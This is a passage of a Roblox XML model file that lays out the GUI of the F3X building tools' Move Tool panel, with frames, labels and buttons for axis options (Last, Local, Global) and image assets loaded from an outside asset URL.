											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX142465C727B34B189E3F3F7DFA44FB91">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX11BA77CDD9474B2285731C6126B31551">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXD39251EAB22341DD91DB282F2814A5D0">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX0C0C87DD86A042DDACB8151A10DAB7AC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">MOVE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX0724C4F2234B44EC94C576FFFD04A24E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294945280</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXCCAFDB140B6A4C2EBF27490A413A4AFB">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">AxesOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX652A9617ED4741E2BD67ED3CFF912670">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXB4E697AEF6214AEAA12E42EEA1DB2D38">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Axes</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXCA9F8BD8F290434DAD21F3C3886C26C2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Last</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>175</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXF2C10099A84E4C03A80957186FF9EC0D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">LAST</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX4A2F4EE753AB41C1A472089F06E44F8B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXF25FD91D59E840ADB3885FD618E7CC48">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0F34E53550E04561B9F69FFF9E4D7E2E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXAC5DF97317834D9EAE73EAAC689CFBD9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Local</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>110</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX9E129426C38344FB983CD13861089C17">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">LOCAL</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX8AF0FE54A50842C4862091D491A7D6FE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXD58A3CE50625453A8577E1F3C8FCBDAB">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX7612B393B3A743F7A3D9E0DB7EAC5DA3">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXA72DB09298CA4F7EB6DF305F06082485">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Global</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX5A204EB72458467191A14B2743D53DD7">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">GLOBAL</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX2985CB1786D54214AD55A91C50EEF9F2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127774197</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
